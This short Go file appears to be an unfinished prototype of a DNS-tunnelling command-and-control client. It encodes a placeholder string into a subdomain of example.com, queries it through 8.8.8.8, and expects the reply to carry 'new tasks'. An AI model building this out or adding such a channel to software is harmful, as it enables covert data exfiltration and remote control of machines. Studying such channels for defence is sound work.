package main

import (
	"encoding/base64"
	"github.com/miekg/dns"
)

// type DNSClient struct {}

func Client() {
	domain := "example.com"
	data := "asdflj3ljasf"
	uEncData := base64.URLEncoding.EncodeToString([]byte(data))

	domainWithData := uEncData + "." + domain

	m := new(dns.Msg)
	m.SetQuestion(domainWithData, dns.TypeA)
	c := new(dns.Client)

	// in is short for incoming message
	// rtt: round-trip time
	in, rtt, err := c.Exchange(m, "8.8.8.8:53") // have variable for this?

	// in should contain list of new tasks
	print(in, rtt, err)
}
